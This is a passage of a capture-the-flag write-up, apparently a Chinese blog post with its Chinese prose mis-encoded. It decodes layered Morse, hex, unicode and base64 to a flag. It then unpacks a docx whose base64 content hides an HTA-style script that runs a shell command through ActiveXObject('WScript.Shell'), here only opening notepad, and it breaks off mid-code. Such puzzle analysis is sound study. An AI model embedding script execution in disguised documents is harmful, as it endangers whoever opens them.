class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <br></code></pre></td></tr></table></figure><p>è§£ç å¾—åˆ°ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034645</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036625</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033305</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036635</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">7530303434</span><br></code></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¾—åˆ°ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;<span class="hljs-symbol">\\</span>u0052<span class="hljs-symbol">\\</span>u0047<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0064<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0042<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u004d<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0074<span class="hljs-symbol">\\</span>u0045<span class="hljs-symbol">\\</span>u005a<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u006b<span class="hljs-symbol">\\</span>u0061<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0035<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u0032<span class="hljs-symbol">\\</span>u0055<span class="hljs-symbol">\\</span>u0030<span class="hljs-symbol">\\</span>u0063<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u006c<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u004e<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u0051<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044&#x27;<br></code></pre></td></tr></table></figure><p>unicodeç¼–ç è½¬æ¢ï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">RGVzdDB<span class="hljs-symbol">nM3</span>tEZW<span class="hljs-number">9</span>kaW<span class="hljs-number">5</span><span class="hljs-symbol">nXzFzX2</span>U<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lf<span class="hljs-symbol">NF9</span>VfQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä»¥ä¸Šç»“æœï¼Œä¸€å¼€å§‹ä»¥ä¸ºè¿™ä¸ªæ˜¯å‡¯æ’’å¯†ç ï¼Œä½†æ˜¯è½¬äº†ä¸€è½®æ²¡æœ‰æ­£ç¡®çš„ã€‚åé¢å°è¯•ç”¨base64å»è§£ï¼Œå‘ç°æˆåŠŸäº†ã€‚ä¸»è¦æ˜¯åé¢çš„%è¯¯å¯¼äº†ã€‚ä½†ç°åœ¨æƒ³ä¸€ä¸‹%3Dä¸å°±æ˜¯URLç¼–ç çš„=å—ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Dest<span class="hljs-number">0</span><span class="hljs-name">g3</span>&#123;Deodi<span class="hljs-symbol">ng_1</span>s_e<span class="hljs-number">4</span>sy_<span class="hljs-number">4</span>_U&#125;<br></code></pre></td></tr></table></figure><h2 id="ä½ çŸ¥é“jså—"><a class="markdownIt-Anchor" href="#ä½ çŸ¥é“jså—"></a> ä½ çŸ¥é“jså—</h2><p>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥æ²¡æœ‰åç¼€åï¼ŒäºŒè¿›åˆ¶æ‰“å¼€çœ‹åˆ°æœ‰ä¸ªpkï¼Œå°±å½“å‹ç¼©åŒ…è§£äº†ã€‚ä½†æ˜¯æ‰“å¼€ä¹‹åè¿™äº›æ–‡ä»¶åƒæ˜¯docxã€‚æ‰€ä»¥åç¼€åå˜ä¸ºdocxæ‰“å¼€ã€‚é‡Œé¢éƒ½æ˜¯å†™å›¾å½¢å­—ç¬¦ã€‚ä¸çŸ¥é“æ˜¯ä»€ä¹ˆã€‚</p><p>åœ¨è§£å‹çš„æ–‡ä»¶ä¸­æ‰¾åˆ°./word/document.xmlé‡Œé¢æœ‰ä¸€å¤§æ®µbase64ç¼–ç çš„å†…å®¹ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„æ–‡æ¡£å†…å®¹ã€‚æå‡ºæ¥ä¸€æ®µçœ‹çœ‹ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PD<span class="hljs-number">94</span>bWwgdmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>iMS<span class="hljs-number">4</span>wIiBlbmNvZGluZz<span class="hljs-number">0</span>iVVRGLTgiIHN<span class="hljs-number">0</span>YW<span class="hljs-number">5</span>kYWxvbmU<span class="hljs-number">9</span>InllcyI/Pgo<span class="hljs-number">8</span>YXNzZW<span class="hljs-number">1</span>ibHkgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYxIiBtYW<span class="hljs-number">5</span>pZmVzdFZlcnNpb<span class="hljs-number">249</span>IjEuMCI+Cjx<span class="hljs-number">0</span>cnVzdEluZm<span class="hljs-number">8</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICAgICAgPHJlcXVlc<span class="hljs-number">3</span>RlZEV<span class="hljs-number">4</span>ZWN<span class="hljs-number">1</span>dGlvbkxldmVsIGxldmVsPSJhc<span class="hljs-number">0</span>ludm<span class="hljs-number">9</span>rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPgo<span class="hljs-number">8</span>YXBwbGljYXRpb<span class="hljs-number">24</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICA<span class="hljs-number">8</span>ZHBpQXdhcmVuZXNzIHhtbG<span class="hljs-number">5</span>zPSJodHRwOi<span class="hljs-number">8</span>vc<span class="hljs-number">2</span>NoZW<span class="hljs-number">1</span>hcy<span class="hljs-number">5</span>taWNyb<span class="hljs-number">3</span>NvZnQuY<span class="hljs-number">29</span>tL<span class="hljs-number">1</span>NNSS<span class="hljs-number">8</span>yMDE<span class="hljs-number">2</span>L<span class="hljs-number">1</span>dpbmRvd<span class="hljs-number">3</span>NTZXR<span class="hljs-number">0</span>aW<span class="hljs-number">5</span>ncyI+RG<span class="hljs-number">8</span>geW<span class="hljs-number">91</span>IGtub<span class="hljs-number">3</span>cganM<span class="hljs-number">8</span>L<span class="hljs-number">2</span>RwaUF<span class="hljs-number">3</span>YXJlbmVzcz<span class="hljs-number">4</span>KPHNjcmlwdCBsYW<span class="hljs-number">5</span>ndWFnZT<span class="hljs-number">0</span>iamF<span class="hljs-number">2</span>YXNjcmlwdCI+ZG<span class="hljs-number">9</span>jdW<span class="hljs-number">1</span>lbnQud<span class="hljs-number">3</span>JpdGUodW<span class="hljs-number">5</span>lc<span class="hljs-number">2</span>NhcGUoJyUzQ<span class="hljs-number">2</span>h<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>Nib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>JTNFJTBBJTBBJTNDJTIxRE<span class="hljs-number">9</span>DVFlQRSUyMGh<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>NodG<span class="hljs-number">1</span>sJTNFJTBBJTNDaGVhZCUzRSUwQSUyMCUyMCUyMCUyMCUzQ<span class="hljs-number">3</span>RpdGxlJTNFRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlM<span class="hljs-number">0</span>MlMkZ<span class="hljs-number">0</span>aXRsZSUzRSUwQSUzQ<span class="hljs-number">0</span>hUQSUzQUFQUExJQ<span class="hljs-number">0</span>FUSU<span class="hljs-number">9</span>OJTBBJTIwJTIwQVBQTElDQVRJT<span class="hljs-number">05</span>OQU<span class="hljs-number">1</span>FJTNEJTIyRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlMjIlMEElMjAlMjBJRCUzRCUyMkluY<span class="hljs-number">2</span>VwdGlvbiUyMiUwQSUyMCUyMFZFUlNJT<span class="hljs-number">04</span>lM<span class="hljs-number">0</span>QlMjIxLjAlMjIlMEElMjAlMjBTQ<span class="hljs-number">1</span>JPTEwlM<span class="hljs-number">0</span>QlMjJubyUyMiUyRiUzRSUwQSUyMCUwQSUzQ<span class="hljs-number">3</span>N<span class="hljs-number">0</span>eWxlJTIwdHlwZSUzRCUyMnRleHQlMkZjc<span class="hljs-number">3</span>MlMjIlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>MlMkZoZWFkJTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJmZWF<span class="hljs-number">0</span>dXJlJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJjb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>JTBBJTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTNDJTJGc<span class="hljs-number">3</span>R<span class="hljs-number">5</span>bGUlM<span class="hljs-number">0</span>UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM<span class="hljs-number">0</span>NoMSUyMGlkJTNEJTIydW<span class="hljs-number">5</span>hdmFpbGFibGUlMjIlMjBjbGFzcyUzRCUyMmxvYWRpbmclMjIlM<span class="hljs-number">0</span>VCdWlsZGluZyUyMGpzLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>lM<span class="hljs-number">0</span>MlMkZoMSUzRSUwQSUwOSUwOSUwOSUwOSUzQ<span class="hljs-number">3</span>NjcmlwdCUyMHR<span class="hljs-number">5</span>cGUlM<span class="hljs-number">0</span>QlMjJ<span class="hljs-number">0</span>ZXh<span class="hljs-number">0</span>JTJGamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUyMGxhbmd<span class="hljs-number">1</span>YWdlJTNEJTIyamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUzRSUwQSUwOSUwOSUwOSUwOSUwOWZ<span class="hljs-number">1</span>bmN<span class="hljs-number">0</span>aW<span class="hljs-number">9</span>uJTIwUnVuRmlsZSUyOCUyOSUyMCU<span class="hljs-number">3</span>QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMFdzaFNoZWxsJTIwJTNEJTIwbmV<span class="hljs-number">3</span>JTIwQWN<span class="hljs-number">0</span>aXZlWE<span class="hljs-number">9</span>iamVjdCUyOCUyMldTY<span class="hljs-number">3</span>JpcHQuU<span class="hljs-number">2</span>hlbGwlMjIlMjklM<span class="hljs-number">0</span>IlMEElMDklMDklMDklMDklMDlXc<span class="hljs-number">2</span>hTaGVsbC<span class="hljs-number">5</span>SdW<span class="hljs-number">4</span>lMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIwJTI<span class="hljs-number">1</span>d<span class="hljs-number">2</span>luZGlyJTI<span class="hljs-number">1</span>JTJGRGVza<span class="hljs-number">3</span>RvcCUyRmpzLnR<span class="hljs-number">4</span>dCUyMiUyQyUyMDElMkMlMjBmYWxzZSUyOSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyRiolMjB<span class="hljs-number">2</span>YXIlMjBvRXhlYyUyMCUzRCUyMFdzaFNoZWxsLkV<span class="hljs-number">4</span>ZWMlMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIyJTI<span class="hljs-number">5</span>JTNCJTIwKiUy<br><br>base<span class="hljs-number">64</span> decode:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span> encoding<span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span> standalone<span class="hljs-operator">=</span><span class="hljs-string">&quot;yes&quot;</span>?&gt;<br>&lt;assembly xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> manifestVersion<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;trustInfo xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>            &lt;requestedExecutionLevel level<span class="hljs-operator">=</span><span class="hljs-string">&quot;asInvoker&quot;</span> uiAccess<span class="hljs-operator">=</span><span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;application xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>        &lt;dpiAwareness xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;Do you know js&lt;/dpiAwareness&gt;<br>&lt;script language<span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript&quot;</span>&gt;document.write(unescape(&#x27;<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cbody<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%21</span>DOCTYPE<span class="hljs-variable">%20</span>html<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ctitle<span class="hljs-variable">%3</span>EDo<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Ftitle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>CHTA<span class="hljs-variable">%3</span>AAPPLICATION<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>APPLICATIONNAME<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Do<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>ID<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Inception<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>VERSION<span class="hljs-variable">%3</span>D<span class="hljs-variable">%221</span>.<span class="hljs-number">0</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>SCROLL<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>no<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cstyle<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fcss<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fhead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>feature<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>content<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fstyle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ch<span class="hljs-number">1</span><span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>unavailable<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>loading<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>EBuilding<span class="hljs-variable">%20</span>js.....<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fh<span class="hljs-number">1</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>Cscript<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fjavascript<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>language<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>javascript<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>function<span class="hljs-variable">%20</span>RunFile<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>WshShell<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>ActiveXObject<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>WScript.Shell<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>WshShell.Run<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%20</span><span class="hljs-variable">%25</span>windir<span class="hljs-variable">%25</span><span class="hljs-variable">%2</span>FDesktop<span class="hljs-variable">%2</span>Fjs.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%201</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>F*<span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>oExec<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>WshShell.Exec<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªscriptæ ‡ç­¾ã€‚æˆ‘ä»¬æŠŠå…¶ä»–æ•°æ®æ®µä¹Ÿæå‡ºæ¥ï¼Œè¿›è¡Œè§£ç ï¼Œç„¶ååªå…³æ³¨scriptæ ‡ç­¾éƒ¨åˆ†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-built_in">unescape</span>(<span 